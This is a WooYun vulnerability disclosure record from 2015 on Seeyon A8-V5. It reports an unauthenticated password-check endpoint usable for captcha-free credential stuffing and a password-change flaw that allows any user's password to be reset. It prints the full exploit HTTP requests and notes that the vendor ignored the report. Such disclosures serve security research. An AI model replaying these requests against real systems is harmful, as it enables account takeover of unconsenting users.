{"id": 21567, "wybug_id": "wooyun-2015-0104942", "wybug_title": "致远A8-V5存在任意用户密码修改漏洞", "wybug_corp": "seeyon.com", "wybug_author": "路人甲", "wybug_date": "2015-03-31 10:55", "wybug_open_date": "2015-07-04 10:57", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-05：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-05-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-04：\t细节向公众公开  简要描述： 致远A8-V5存在两个漏洞一是无视验证码撞库二是任意用户密码修改 详细说明：  一是无视验证码撞库致远A8-V5在设计时存在逻辑错误，用户修改密码时对原密码进行了验证，但是验证使用的服务存在未授权访问漏洞，系统对非合法请求的原密码验证功能进行回应，导致了无视验证码，无需login页面进行密码尝试二是任意用户密码修改致远A8-V5在设计时存在逻辑错误，在上一步对原始密码进行验证后，下一步不再检测原始密码，从而直接修改用户密码，导致平行权限的越权漏洞。   漏洞证明：  一是无视验证码撞库POST穷举用户和密码代码如下\nGET /seeyon/getAjaxDataServlet?S=ajaxOrgManager&M=isOldPasswordCorrect&CL=true&RVT=XML&P_1_String=admin&P_2_String=wy123456 HTTP/1.0Accept: */*Accept-Language: zh-cnReferer: http://a8v51.seeyon.com/seeyon/individualManager.do?method=managerFramerequesttype: AJAXContent-Type: application/x-www-form-urlencodedCookie: User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoHost: a8v51.seeyon.comDNT: 1Proxy-Connection: Keep-Alive\n\n\n显示true为该用户密码正确，轮询P_1_String参数即可撞库。二是任意用户密码修改在上一步完成之后，页面调转到提交修改请求页面POST如下数据\nPOST /seeyon/individualManager.do?method=modifyIndividual HTTP/1.0Accept: text/html, application/xhtml+xml, */*Referer: http://a8v51.seeyon.com/seeyon/individualManager.do?method=managerFrameAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like GeckoContent-Type: application/x-www-form-urlencodedProxy-Connection: Keep-AlivePragma: no-cacheContent-Length: 86DNT: 1Host: a8v51.seeyon.comCookie: JSESSIONID=DA71A65B3AAD45823A1FADAB80A3E685; Hm_lvt_49c0fa7f96aa0a5fb95c62909d5190a6=1419221849,1419232608; avatarImageUrl=8469117046183055270; loginPageURL=\"/main.do\"individualName=admin&formerpassword=123456&nowpassword=wy123456&validatepass=wy123456\nindividualName为用户名注意，此处需要以一个合法的JSESSIONID发送如上数据即可修改任意用户密码，合法的JSESSIONID由撞库得出。本次证明演示中修改的用户为admin，修改为wy123456   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-07-04 10:57 厂商回复：  漏洞Rank：12  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-29 23:54 |    \t\t鸡鸡 \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:4        )\t\t \n  洞主能给详细说一下么~万分感谢    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}